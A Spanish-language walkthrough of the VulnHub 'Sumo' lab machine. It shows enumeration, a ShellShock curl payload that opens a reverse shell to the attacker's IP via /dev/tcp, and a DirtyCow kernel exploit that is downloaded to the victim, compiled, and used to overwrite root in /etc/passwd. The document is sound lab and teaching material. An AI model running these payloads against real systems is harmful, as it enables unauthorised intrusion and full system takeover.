# Sumo

Hoy vamos a resolver la maquina Sumo, donde estaremos tocando conceptos como explotación y abuso de ShellShock, así como explotación de Kernel en un nivel bastante basico.
- Plataforma: [VulnHub](https://www.vulnhub.com/)
- Dificultad: Beginner
- Meta: Obtener un shell root, es decir (root@localhost:~#) y luego obtener la bandera en /root

- Iniciamos haciendo ping a la IP para asegurarnos que la maquina esté activa, tuve problemas con herramientas como arp-scan o  netdiscover, así que me cree un [script](https://github.com/JoseVazquez101/My-scr1pt5/blob/main/hostscan.sh) para escanear mi red local:
- También he decidido añadir una resolución DNS local con el siguiente comando:
  ~~~bash
  echo '192.168.17.135  sumo.vh' >> /etc/hosts
  ~~~
- Si todo funciona, llegaría la hora de realizar el escaneo con nmap, los parametros que suelo utilizar son los siguientes:

  ~~~bash 
  sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV sumo.vh
  ~~~

- Y vemos que hay un servicio http ejecutándose en el equipo objetivo:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/c6ed23ff-9506-4704-893d-1d29ebd415e5)
![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/08d67928-4a47-4034-979f-442a77dfe4fb)

- Con esto en mente, podemos realizar una enumeración de directorios de la siguiente manera:
~~~ bash
gobuster dir -u http://sumo.vh -w /usr/share/wordlists/dirb/big.txt -t 20 --add-slash --no-error
~~~

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/0dcccee1-4d6b-4f11-b89e-3ee6d5f1256e)

- A simple vista podríamos pensar que no existe nada fuera de lugar, pero para los ojos mas experimentados, la ruta **/cgi-bin** resulta llamativa, pues podríamos intentar enumerarla a ver si podemos explotar un posible [ShellShock](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi)
- Enumeramos http://sumo.vh/cgi-bin/ y vemos algo interesante:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/814c14dd-5bdb-4f63-9d58-ffbda98ad686)

  - Intentaremos ganar acceso a través de un header malicioso con Curl, que incluirá un reverse shell, esto de la siguiente manera:
  
~~~ bash 
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.17.128/4444 0>&1' http://sumo.vh/cgi-bin/test.sh
~~~

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/0ee81383-92a7-4e86-9082-773ad162df77)

- Y estamos dentro :D

***
<h3>PrivEsc</h3>
- Al entrar, podemos comprobar que somos www-data, por lo que tendremos que enumerar de manera bastante detallada los vectores para escalar privilegios:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/44d3032e-74cc-405d-bc27-02189c9a8a9f)

- Hacemos un tratamiento de TTY de la siguiente forma para mas comodidad (opcional):
~~~ bash
script /dev/null -c bash
^Z
#Dejamos nuestra sesión en segundo plano
stty raw -echo; fg
#Nuestro tecleo será invisible, reiniciamos la xterm de igual manera
reset xterm
#Nos aparecerá un mensaje
export TERM=xterm
export SHELL=bash
~~~

- Después de enumerar por distintos vectores de ataque, me decidí centrar en algo que me llamó la atención, la versión de kernel parecía antigua, al ser una 3.2.0-23-generic:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/33f291ad-47b5-47af-9035-4f3ed23ee414)

- Si buscamos en Searchsploit por kernel 3.2 podremos encontrar algunos exploits, pero los mas interesantes son los de DirtyCow:
    ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/918a1816-afe4-462d-a4a5-b69c1bebf481)
- Vemos que están basados en Race Condition, elegiremos el que está enfocado en PrivEsc (linux/local/40839.c)
- Nos pasamos el script de la siguiente manera al directorio actual:
  ~~~ bash
  searchsploit -m 40839.c
  ~~~

- La maquina victima tiene gcc, así que podemos compilarlo desde ahí, por lo que montamos un servidor http desde nuestro lado y lo descargamos con wget:
	- En mi maquina:
	  ~~~ bash
	  python3 -m http.server 1234
	  ~~~
	  - En la maquina victima:
	  ~~~ bash
	  cd /tmp
	  wget http://192.168.17.128:1234/40839.c
	  gcc -pthread 40839.c -o dirty.o -lcrypt
	  ~~~
- Tuve algunos problemas con el binario de gcc en la maquina, así que tuve que mover mi binario de gcc con el servidor de python y cambiar la PATH para que buscase en mi directorio, por si a alguien mas le sucede, lo cambié así:
  - En mi maquina:
~~~ bash
cd /usr/bin
python3 -m http.server 1234
~~~
 - En la maquina victima:
~~~ bash
wget http://192.168.17.128:1234/gcc
export PATH=/tmp:$PATH 
~~~

- Ahora ejecutamos el binario compilado y asignaremos una contraseña, en pocas palabras el código erradica al ussuario root y lo sustituye por otro con una uid 0, modificando con este permiso el archivo de /etc/passwd y asignando una contraseña conocida:
  - Y con esto seremos un usuario con permisos root
  ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/dff2a24b-d0c5-4492-a997-66f34024652a)

  - Tomamos la bandera y podriamos dar por concluida la maquina :D
  ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/921deb7b-cdee-42d1-9276-ea4fb6d0e245)

  
